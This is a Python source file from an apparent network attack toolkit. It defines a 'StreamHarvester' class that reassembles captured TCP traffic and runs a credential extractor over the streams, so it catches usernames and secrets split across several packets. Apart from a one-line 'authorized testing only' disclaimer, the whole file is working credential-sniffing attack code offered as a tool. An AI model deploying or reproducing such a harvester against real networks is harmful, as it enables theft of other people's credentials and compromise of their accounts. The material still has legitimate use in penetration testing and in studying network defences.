"""Stream-aware credential harvester.

Feeds captured frames through the TCP reassembler and runs the credential
extractor on the reassembled, in-order byte stream — so credentials that span
multiple TCP segments (or share a keep-alive connection) are caught, which the
per-packet harvester misses.

For authorized testing only.
"""

from __future__ import annotations

from reforge.attacks.creds import Credential, CredentialExtractor
from reforge.core.tcpreasm import TcpReassembler


class StreamHarvester:
    def __init__(self, max_stream: int = 262144):
        self.reasm = TcpReassembler()
        self.extractor = CredentialExtractor()
        self._streams: dict[tuple, bytearray] = {}
        self._seen: set = set()
        self.max_stream = max_stream

    def add_frame(self, frame_bytes: bytes) -> list[Credential]:
        """Feed one Ethernet frame; return credentials newly completed."""
        from scapy.layers.l2 import Ether

        try:
            pkt = Ether(frame_bytes)
        except Exception:
            return []
        found: list[Credential] = []
        for key, data in self.reasm.process(pkt):
            src, _sport, dst, dport = key
            buf = self._streams.setdefault(key, bytearray())
            buf += data
            if len(buf) > self.max_stream:              # cap unbounded streams
                del buf[:len(buf) - self.max_stream]
            text = bytes(buf).decode("latin-1", "replace")
            for c in self.extractor.extract_text(text, src, dst, dport, key):
                sig = (c.kind, c.username, c.secret, c.src, c.dst)
                if sig not in self._seen:
                    self._seen.add(sig)
                    found.append(c)
        return found
